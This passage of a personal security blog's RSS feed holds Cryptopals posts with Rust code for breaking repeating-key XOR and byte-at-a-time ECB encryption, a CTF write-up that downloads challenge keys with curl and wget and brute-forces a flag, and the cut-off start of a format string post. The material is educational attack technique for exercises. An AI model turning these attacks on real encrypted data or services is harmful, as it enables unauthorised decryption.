        compute the hamming distance
    compute the average of hamming distances
    normalize the average by dividing by the key length
the value with the minimum normalized value is the key length
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A possible implementation would be:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;let mut keysize = 0;
let mut norm_distance = f64::MAX;
for i in 2..41 {
    if data.len() - 1 &amp;lt; 4 * i {
        continue;
    }

    let current_norm_distance = avg_hamming_distance_bytes(data, i) as f64 / i as f64;
    if current_norm_distance &amp;lt;= norm_distance {
        norm_distance = current_norm_distance;
        keysize = i;
    }
}

fn avg_hamming_distance_bytes(data: &amp;amp;[u8], keysize: usize) -&amp;gt; u64 {
    let n = 4;
    let sum_distances = (0..n - 1)
        .flat_map(|i| {
            (i + 1..n).map(move |j| {
                (
                    (i * keysize, (i + 1) * keysize),
                    (j * keysize, (j + 1) * keysize),
                )
            })
        })
        .map(|((a, b), (c, d))| hamming_distance_bytes(&amp;amp;data[a..b], &amp;amp;data[c..d]))
        .sum::&amp;lt;u64&amp;gt;();

    sum_distances / (6 * keysize) as u64
}

fn hamming_distance_bytes(a: &amp;amp;[u8], b: &amp;amp;[u8]) -&amp;gt; u64 {
    debug_assert_eq!(a.len(), b.len());

    xor_bytes(a, b)
        .iter()
        .flat_map(|byte| (0..8).map(move |i| (byte &amp;gt;&amp;gt; i) &amp;amp; 1))
        .filter(|b| b == &amp;amp;1)
        .count() as u64
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Group ciphertext bytes by key byte used to encrypt&lt;/h2&gt;
&lt;p&gt;We will split the ciphertext into blocks of key length and group them
based on their position. The first byte of each block will go into the
first group, the second byte of each block will go into the second
group, etc. The goal is to get as many groups as key characters and for
each group to contain the ciphertext bytes encrypted with a particular
key character.&lt;/p&gt;
&lt;p&gt;Each group will help us find one character of the key.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;break ciphertext into blocks of key length
transpose the blocks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A possible implementation would be:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;let data_chunks = data.chunks(keysize).collect::&amp;lt;Vec&amp;lt;&amp;amp;[u8]&amp;gt;&amp;gt;();
let data_chunks = transpose(&amp;amp;data_chunks);

fn transpose&amp;lt;T: Copy&amp;gt;(data: &amp;amp;[&amp;amp;[T]]) -&amp;gt; Vec&amp;lt;Vec&amp;lt;T&amp;gt;&amp;gt; {
    let mut transposed = vec![vec![]; data[0].len()];
    for row in data {
        for (j, &amp;amp;value) in row.iter().enumerate() {
            transposed[j].push(value);
        }
    }

    transposed
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Get the key character for each group&lt;/h2&gt;
&lt;p&gt;With the ciphertext bytes grouped, we can brute force each key
character. The idea is to decrypt each block for each possible ASCII
value and check which one returns the text closest to English, Spanish,
or the language used. We do that by checking the frequency of the
letters.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;for each possible character
    decrypt the message
    compute how similar it is to english
the character that produces the most similar english data is the key character
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A possible implementation would be:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;let password = data_chunks
    .iter()
    .map(|chunk| break_single_xor_bytes(chunk).key)
    .collect::&amp;lt;String&amp;gt;();

pub struct DecryptMetadata {
    pub key: char,
    pub english_similarity: f64,
    pub decrypted_data: String,
}

impl Default for DecryptMetadata {
    fn default() -&amp;gt; Self {
        Self {
            key: &apos;.&apos;,
            english_similarity: f64::MAX,
            decrypted_data: String::new(),
        }
    }
}

pub fn break_single_xor_bytes(data: &amp;amp;[u8]) -&amp;gt; DecryptMetadata {
    let mut decrypt_metadata = DecryptMetadata::default();
    for i in 0..256u16 {
        let repeating_key = vec![i as u8; data.len()];
        let xor_data = xor_bytes(data, &amp;amp;repeating_key);
        let Some(decrypted_data) = String::from_utf8(xor_data).ok() else {
            continue;
        };

        let characters_count = count_characters(&amp;amp;decrypted_data.to_ascii_lowercase());

        let ascii_data_length = decrypted_data.chars().count() as f64;
        let actual_frequencies = compute_frequencies(characters_count, ascii_data_length);

        let similarity = similarity_to_english(actual_frequencies);
        if similarity &amp;lt; decrypt_metadata.english_similarity {
            decrypt_metadata = DecryptMetadata {
                key: i as u8 as char,
                english_similarity: similarity,
                decrypted_data,
            };
        }
    }

    decrypt_metadata
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Code&lt;/h2&gt;
&lt;p&gt;You can check the whole implementation
&lt;a href=&quot;https://github.com/danielorihuela/cryptopals/blob/main/src/set1/challenge6.rs&quot;&gt;https://github.com/danielorihuela/cryptopals/blob/main/src/set1/challenge6.rs&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The XOR cipher is simple but easy to attack. Modern products should
avoid it at all costs. Instead, use OTP (if you can manage the
complexity) or AES.&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/cryptopals.B5aQRihb.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep001 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep001ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep001ch01/</guid><description>Reverse engineer your way to solving H4ck1ng G00gl3 ep001 challenge 01. Extract strings, find private keys, and decrypt the flag to crack this challenge.</description><pubDate>Tue, 18 Oct 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep001
challenge 01&lt;/strong&gt;. This challenge is about &lt;strong&gt;Reverse Engineering&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After opening the challenge, we get a zip file. This zip file contains
another compressed file that includes two files. We have the flag, even
though we cannot read it yet. It is in binary. And an executable with
the name wannacry.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch01/wannacry-manpage.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The wannacry executable takes an encrypted file and the encryption key
as arguments. We already have the encrypted file, in other words, the
flag file. However, we are missing the private key. The executable must
have some information about that. For that reason, I decided to extract
all the strings from the executable and see if there was something
interesting. To do that, we can use the &quot;strings&quot; command in Linux.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;strings wannacry
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;At first, I was reading the output. It was huge, and most of the
extracted strings were gibberish. This approach was not good. Then, I
searched for some keywords: flag, private, public, solve, decrypt,
encrypt, etc. The keyword &quot;key&quot; lead me to a domain.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch01/http-with-pems.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I visited this domain and saw a list of private keys with long
alphanumeric names. I did not have any hint about which of these private
keys could be the one that I needed. Anyway, there were only around two
hundred private keys. Therefore, we should be able to decrypt the flag
file with every single private key in a small amount of time. With that
strategy in mind, I downloaded all the private keys.&lt;/p&gt;
&lt;p&gt;First, we need to obtain a list with the filenames of every private key.
We can do that with the following bash line.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/ \
    | awk &apos;{split($0,a,&quot;\&quot;&quot;); print a[2]}&apos; &amp;gt; pemfilenames
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now that we have a list of all the filenames. We can download all the
private keys.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;for pemfile in $(cat pemfilenames); do
    wget https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/$pemfile -P pemkeys
done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finally, we can decrypt the flag with every private key file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;for pem in $(ls pemkeys); do
    ./wannacry -encrypted_file flag -key_file pemkeys/$pem
done &amp;gt; result
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, we can obtain the flag. We only need to get the strings from the
&quot;result&quot; file and find the flag. We can do that with the following bash
command.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;strings result| grep solve
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Cryptopals: Break an ECB encrypted message (easy)</title><link>https://danielorihuela.dev/blog/break-ecb/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/break-ecb/</guid><description>Learn to break a message encrypted with the ECB block cipher mode (easy exercise).</description><pubDate>Thu, 10 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ecb-block-cipher-mode&quot;&gt;ECB block cipher mode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#break-ecb-mode-easy-level&quot;&gt;Break ECB mode (easy level)&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#find-the-block-size&quot;&gt;Find the block size&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#check-if-oracle-is-using-ecb-mode&quot;&gt;Check if oracle is using ECB
mode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#break-the-first-byte&quot;&gt;Break the first byte&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#break-the-following-bytes&quot;&gt;Break the following bytes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#code&quot;&gt;Code&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Today, we will learn about the ECB block cipher mode, how it works, and
how to break it. This post is related to
&lt;a href=&quot;https://cryptopals.com/sets/2/challenges/12&quot;&gt;https://cryptopals.com/sets/2/challenges/12&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;ECB block cipher mode&lt;/h1&gt;
&lt;p&gt;The Electronic Code Book (ECB) is a block cipher mode of operation. Data
is encrypted in blocks of fixed size and with the same key. Also, some
bytes are added when the plaintext doesn&apos;t have a length that is a
multiple of the block size, known as &lt;code&gt;padding&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let &lt;code&gt;p&lt;/code&gt; be the plaintext, &lt;code&gt;c&lt;/code&gt; the ciphertext, &lt;code&gt;k&lt;/code&gt; the key, and &lt;code&gt;cipher&lt;/code&gt;
any encryption algorithm. Assume that the ciphertext can be divided into
blocks of length equal to &lt;code&gt;k&lt;/code&gt;, without any leftover bytes. For each &lt;code&gt;i&lt;/code&gt;
from 0 to the number of blocks in the plaintext, we have that
&lt;code&gt;c[i] = cipher(p[i], k)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The main issue with this mode is that it reuses the same key for all
blocks. You might think that this shouldn&apos;t be a problem. However,
identical plain blocks will return the same encrypted blocks. It becomes
apparent when you see the following images.&lt;/p&gt;
&lt;p&gt;&amp;lt;center&amp;gt; Plain image &amp;lt;/center&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/break-ecb/penguin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;center&amp;gt; Image encrypted with ECB mode &amp;lt;/center&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/break-ecb/ecb_penguin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The data was encrypted, but we can still see the penguin… more or less.
Let&apos;s see how we can break this block cipher mode.&lt;/p&gt;
&lt;h1&gt;Break ECB mode (easy level)&lt;/h1&gt;
&lt;p&gt;Let&apos;s pretend we have access to an encryption oracle that encrypts data
in a particular way. It encrypts the result of appending some data to
the user input. This oracle also knows the secret key.&lt;/p&gt;
&lt;p&gt;In rust, this could look like this.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// Cipher function
pub fn encrypt(data: &amp;amp;[u8], key: &amp;amp;[u8]) -&amp;gt; Vec&amp;lt;u8&amp;gt; {
    let unknown_string = BASE64_STANDARD.decode(UNKNOWN_STRING).expect(&quot;Valid data&quot;);
    let data = [data, &amp;amp;unknown_string].concat();

    encrypt_aes_128_ecb(&amp;amp;data, key)
}

fn main() {
  ...
  let key = random_bytes(16);
  let encryption_fn = |data: &amp;amp;[u8]| encrypt(data, &amp;amp;key); // encryption oracle
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Of course, in a real scenario, we won&apos;t implement the function
ourselves. We will be given call access to it. With the preparation out
of the way, let&apos;s move into the first step for breaking ECB.&lt;/p&gt;
&lt;h2&gt;Find the block size&lt;/h2&gt;
&lt;p&gt;We are using 128-bit block size, but we won&apos;t have this information
available in every situation. There&apos;s a very simple way to discover the
block size. Remember, ECB encrypts data in blocks of fixed size. Thus,
if we find two inputs that return ciphertexts of different lengths, the
difference must be the block size.&lt;/p&gt;
&lt;p&gt;To get familiar with this idea, let&apos;s go to
&lt;a href=&quot;https://www.devglan.com/online-tools/aes-encryption-decryption&quot;&gt;https://www.devglan.com/online-tools/aes-encryption-decryption&lt;/a&gt; and
play around with it. You will see that the result of encrypting strings
between 1 and 15 characters returns ciphertexts of equal length. But, as
soon as you encrypt a string with 16 characters, the ciphertext length
increases. Take into account that the result is in base64 by default.
Hence, the length increase won&apos;t match the block size.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&quot;a&quot;      -&amp;gt; &quot;kc86jk6HnV9AtZ57SmbuJw==&quot;
&quot;aa&quot;     -&amp;gt; &quot;UAGUUSk778f9tDRGTVKvYw==&quot;
...
&quot;a&quot; * 16 -&amp;gt; &quot;UOrlU8c7SzBd+8BGIi4CAJHPOo5Oh51fQLWee0pm7ic=&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&apos;s see an implementation.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pub fn compute_block_size_and_padding_length&amp;lt;F&amp;gt;(encryption_fn: F) -&amp;gt; (usize, usize)
where
    F: Fn(&amp;amp;[u8]) -&amp;gt; Vec&amp;lt;u8&amp;gt;,
{
    let mut i = 0;
    let mut len_diff = 0;
    while len_diff == 0 {
        len_diff = encryption_fn(&amp;amp;vec![0; i + 1]).len() - encryption_fn(&amp;amp;vec![0; i]).len();
        i += 1;
    }

    (len_diff, i)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Computing the padding is not needed. It&apos;s a nice-to-have. It helps with
printing the original message, once broken, without the padding.&lt;/p&gt;
&lt;h2&gt;Check if oracle is using ECB mode&lt;/h2&gt;
&lt;p&gt;Again, we might not have this information readily available in a real
situation. Thus, we must practice how we can check if ECB is being used.&lt;/p&gt;
&lt;p&gt;We will feed the encryption oracle with an unnecessarily long input that
uses the same character over and over again. In the resulting
ciphertext, we will check if all blocks are equal. If that&apos;s the case,
the oracle uses ECB mode. Remember that ECB uses the same key to encrypt
different blocks. Hence, the same plain blocks return the same encrypted
blocks.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NOTE&lt;/p&gt;
&lt;p&gt;In this particular exercise, the oracle appends some unknown data. We
need to check if the number of repeated blocks is greater or equal
than the number of input ones. Some encrypted blocks could have the
same value.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;pub fn is_ecb&amp;lt;F&amp;gt;(encryption_fn: F, block_size: usize) -&amp;gt; bool
where
    F: Fn(&amp;amp;[u8]) -&amp;gt; Vec&amp;lt;u8&amp;gt;,
{
    let plain = vec![0; block_size * 100];
    let ciphertext = encryption_fn(&amp;amp;plain);

    max_repeated_block(&amp;amp;ciphertext) &amp;gt;= 100
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Break the first byte&lt;/h2&gt;
&lt;p&gt;At a high level, what we want to do is isolate the first byte and
brute-force the value. The general flow is more complex. Let&apos;s start
with the pseudocode to break the first byte.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;prefix = string of length block size - 1
ciphertext = encryption_oracle(prefix)

every_possible_ciphertext = empty dictionary
for each possible character
  current_prefix = prefix + character
  possible_ciphertext = encryption_oracle(current_prefix)
  store possible_ciphertext in every_possible_ciphertext

for (character, possible_ciphertext) in every_possible_ciphertext
  if ciphertext == possible_ciphertext
    return character
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&apos;s walk through the pseudocode step by step.&lt;/p&gt;
&lt;p&gt;First, we build an input to isolate the first byte of the unknown
string. Since our input is one byte smaller than the block size, the
first byte of the unknown string will move into the first block of data.
Calling the oracle with that will give us the &quot;actual&quot; ciphertext.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Example

block_size = 16
unknown_string = &quot;mydata...&quot;
prefix = &quot;a&quot; x 15

Encryption oracle will use the following
data as input to be encrypted

data = &quot;aaaaaaaaaaaaaaamydata...&quot;
        | first block  | second block
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We are in full control of the prefix. The only unknown is the last
character. The one we want to decrypt.&lt;/p&gt;
&lt;p&gt;Second, we want to construct every possible ciphertext. For that, we
will call the encryption oracle with each possible character that could
appear in the message, appended to the prefix.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Example

We call the oracle with

input = &quot;aaaaaaaaaaaaaaaa&quot;
input = &quot;aaaaaaaaaaaaaaab&quot;
input = &quot;aaaaaaaaaaaaaaac&quot;
...
input = &quot;aaaaaaaaaaaaaaaz&quot;
input = &quot;aaaaaaaaaaaaaaa!&quot;
...
input = &quot;aaaaaaaaaaaaaaa:&quot;

and we create a dictionary

&quot;a&quot; -&amp;gt; first possible ciphertext
&quot;b&quot; -&amp;gt; second possible ciphertext
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Third and last step, we must find which of the possible ciphertexts is
equal to the &quot;actual&quot; ciphertext. The one we got from calling the oracle
with the prefix.&lt;/p&gt;
&lt;p&gt;With that, we broke the first byte. Hurray!!!&lt;/p&gt;
&lt;p&gt;In rust, it could look something like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;let prefix = vec![0; block_size - 1];
let ciphertext_block_to_character = brute_force_ciphertext_block(&amp;amp;encrypt_fn, prefix, 0, block_size);
let ciphertext = encrypt_fn(&amp;amp;prefix);
let character = ciphertext_block_to_character.get(&amp;amp;ciphertext[0..16]).expect(&quot;Exists&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I&apos;m leaving some functions and extra details out. We will see them in
the next section.&lt;/p&gt;
&lt;h2&gt;Break the following bytes&lt;/h2&gt;
&lt;p&gt;Breaking ECB is an iterative method. Breaking the second byte requires
knowing the first byte. Breaking the third byte requires knowing the
first and the second bytes. Breaking the nth byte requires knowing the
previous &quot;block size minus one&quot; bytes.&lt;/p&gt;
&lt;p&gt;To break the message, we have to generalize the method used to break the
first byte. With a bit of arithmetic, we can handle it. Let&apos;s see the
modified mechanisms.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Extend crafted prefix&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;To break the following byte, we will use all previous decrypted bytes.
Prefixes will still be one byte smaller than the block size, but they
will include the decrypted bytes preceding the byte we want to break. To
accomplish that, on each iteration, we will append the last decrypted
character and remove the first byte. That assures us that the difference
between all the possible ciphertexts in the dictionary and the
ciphertext we are searching for is only one byte. The last one. All
previous bytes are known to us. Otherwise, the dictionary must be built
based on many unknowns instead of one. One for each unknown character.
It quickly gets intractable. That&apos;s the reason we go byte by byte.&lt;/p&gt;
&lt;p&gt;In general, breaking the nth byte requires knowing the previous &quot;block
size minus one&quot; bytes. This reduces the unknowns to one byte, which we
can easily brute-force.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Example

block size = 16
unknown string = &quot;random message data&quot;

Iteration 1
prefix = &quot;aaaaaaaaaaaaaaa&quot;
          | used prefix |
we break the first byte and obtain &quot;r&quot;

Iteration 2
prefix = &quot;aaaaaaaaaaaaaaar&quot;
           | used prefix |
we break the second byte and obtain &quot;a&quot;

Iteration 3
prefix = &quot;aaaaaaaaaaaaaaara&quot;
            | used prefix |
we break the third byte and obtain &quot;n&quot;

...

Iteration n
prefix = &quot;aaaaaaaaaaaaaaarandom message dat&quot;
                            | used prefix |
we break the last byte and obtain &quot;a&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Isolate following bytes&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We need to accommodate the prefix to prepare the following byte we want
to break. To accomplish that, we decrease the size of the prefix by one
on each iteration. Once the prefix length is zero, we have broken all
the bytes from the block. To break the following block, we come back to
using a prefix of &quot;block size minus one&quot; characters and repeat the
process.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Example

block size = 16
unknown string = &quot;random message data&quot;

Iteration 1
input = &quot;a&quot; x 15
encryption_oracle will encrypt &quot;aaaaaaaaaaaaaaarandom message data&quot;
                                | first block  | second block  |
we break the first byte and obtain &quot;r&quot; (first block)

Iteration 2
input = &quot;a&quot; x 14
encryption_oracle will encrypt &quot;aaaaaaaaaaaaaarandom message data&quot;
                                | first block  | second block  |
we break the second byte and obtain &quot;a&quot; (first block)

Iteration 3
input = &quot;a&quot; x 13
encryption_oracle will encrypt &quot;aaaaaaaaaaaaarandom message data&quot;
                                | first block  | second block  |
we break the third byte and obtain &quot;n&quot; (first block)

...

Iteration 16
input = &quot;&quot;
encryption_oracle will encrypt &quot;random message data&quot;
                                | first block  | second block  |
we break the sixteenth byte and obtain &quot;d&quot; (first block)
first block completed, we have to break the second block now

Iteration 17
input = &quot;a&quot; x 15
encryption_oracle will encrypt &quot;aaaaaaaaaaaaaaarandom message data&quot;
                                | first block  | second block  |
we break the seventeenth byte and obtain &quot;a&quot; (second block)

...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Brute-force the correct block&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I didn&apos;t show it, but the function that creates the dictionary with all
the possible ciphertexts only stores one block of data, not the whole
ciphertext. That remains the same, but we have to make sure that we
compare the correct ciphertext block against each possible ciphertext
block in the dictionary.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;let start = (i / block_size) * block_size;
let end = start + block_size;
let character = ciphertext_block_to_character.get(&amp;amp;ciphertext[start..end]).expect(&quot;Exists&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;That&apos;s about it. We are ready to see the final implementation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Implementation&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Before moving forward, let me explain an important detail about the
&lt;code&gt;brute_force_ciphertext_block&lt;/code&gt; function. This function returns a
dictionary with every possible ciphertext. If you read the
implementation, you will see that we always store the first block of the
ciphertext. That might be confusing, but it has a simple explanation.
The encryption oracle doesn&apos;t prepend any information. Besides, to get
every possibility, we only care about the prefix plus any given letter.
At this step, the string appended by the oracle is irrelevant. We only
care about the ciphertext of the data we are feeding in, which becomes
the first block of the resulting ciphertext.&lt;/p&gt;
&lt;p&gt;That&apos;s it. I just wanted to explain the inner workings of that function,
so that&apos;s clear what&apos;s going on.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pub fn attack_ecb_one_byte_at_a_time&amp;lt;F&amp;gt;(encrypt_fn: F) -&amp;gt; String
where
    F: Fn(&amp;amp;[u8]) -&amp;gt; Vec&amp;lt;u8&amp;gt;,
{
    let (block_size, padding_length) = compute_block_size_and_padding_length(&amp;amp;encrypt_fn);
    if !is_ecb(&amp;amp;encrypt_fn, block_size) {
        panic!(&quot;Data not encryped with ECB&quot;);
    }

    let mut plain = vec![0; block_size - 1];
    let num_target_bytes = encrypt_fn(&amp;amp;[]).len() - padding_length;
    for i in 0..num_target_bytes {
        let crafted_prefix = &amp;amp;plain[plain.len() - (block_size - 1)..];
        let ciphertext_block_to_character =
            brute_force_ciphertext_block(&amp;amp;encrypt_fn, crafted_prefix, 0, block_size);

        let raw_prefix = vec![0; block_size - 1 - (i % block_size)];
        let ciphertext = encrypt_fn(&amp;amp;raw_prefix);
        let start = (i / block_size) * block_size;
        let end = start + block_size;
        let character = ciphertext_block_to_character
            .get(&amp;amp;ciphertext[start..end])
            .expect(&quot;Exists&quot;);

        plain.push(*character);
    }

    String::from_utf8(plain[block_size - 1..].to_vec()).expect(&quot;Valid plain message&quot;)
}

pub fn brute_force_ciphertext_block&amp;lt;F&amp;gt;(
    encryption_fn: F,
    prefix: &amp;amp;[u8],
    block_position: usize,
    block_size: usize,
) -&amp;gt; HashMap&amp;lt;Vec&amp;lt;u8&amp;gt;, u8&amp;gt;
where
    F: Fn(&amp;amp;[u8]) -&amp;gt; Vec&amp;lt;u8&amp;gt;,
{
    let mut encrypted_block_to_character = HashMap::new();
    for i in 0..=255u8 {
        let prefix_with_character = [prefix, &amp;amp;[i]].concat().to_vec();
        let encrypted_data = encryption_fn(&amp;amp;prefix_with_character);
        let start = block_position * block_size;
        let end = start + block_size;
        let encrypted_block = encrypted_data[start..end].to_vec();
        encrypted_block_to_character.insert(encrypted_block, i);
    }

    encrypted_block_to_character
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Code&lt;/h2&gt;
&lt;p&gt;You can check the whole implementation
&lt;a href=&quot;https://github.com/danielorihuela/cryptopals/blob/main/src/set2/challenge12.rs&quot;&gt;https://github.com/danielorihuela/cryptopals/blob/main/src/set2/challenge12.rs&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The ECB cipher is simple but highly insecure due to its deterministic
nature, which leaks patterns in the plaintext. This exercise
demonstrates how easily it can be broken. Modern cryptographic systems
should avoid ECB mode entirely and instead use secure modes of operation
like Galois Counter Mode (GCM) or Counter Mode (CTR).&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/cryptopals.B5aQRihb.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Format string vulnerability</title><link>https://danielorihuela.dev/blog/format_string_vuln/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/format_string_vuln/</guid><description>Learn how format string exploits work and discover preventive measures to safeguard your code against them.</description><pubDate>Mon, 29 Jan 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#whats-a-format-string-vulnerability&quot;&gt;What&apos;s a format string
vulnerability?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#whats-the-problem&quot;&gt;What&apos;s the problem?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#format-string-vulnerability-demo&quot;&gt;Format String vulnerability
demo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#write-to-memory-address&quot;&gt;Write to memory address&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#write-arbitrary-bytes-to-memory-address&quot;&gt;Write arbitrary bytes to memory
address&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#direct-access-and-short-writes&quot;&gt;Direct access and short writes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#overwrite-global-offset-table-to-get-a-shell&quot;&gt;Overwrite Global Offset Table to get a
shell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;What&apos;s a format string vulnerability?&lt;/h1&gt;
&lt;p&gt;A format string vulnerability is a type of bug that can happen when we
process user input with format strings. For example, C has several
functions that allow it to do that. One of them is &lt;code&gt;printf&lt;/code&gt; (e.g.
&lt;code&gt;printf(&quot;I am %i years old&quot;, 999);&lt;/code&gt;). An attacker can exploit them to
read and write to arbitrary memory locations, execute arbitrary code or
make the program crash.&lt;/p&gt;
&lt;h1&gt;What&apos;s the problem?&lt;/h1&gt;
&lt;p&gt;The main problem is that the format string, when unchecked, let&apos;s user
insert format parameters to read and write memory addresses inside and
before the stack. For example, let&apos;s take the following C line of code.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;printf(&quot;hello %x %x&quot;, 3, 7);
&lt;/code&gt;&lt;/pre&gt;
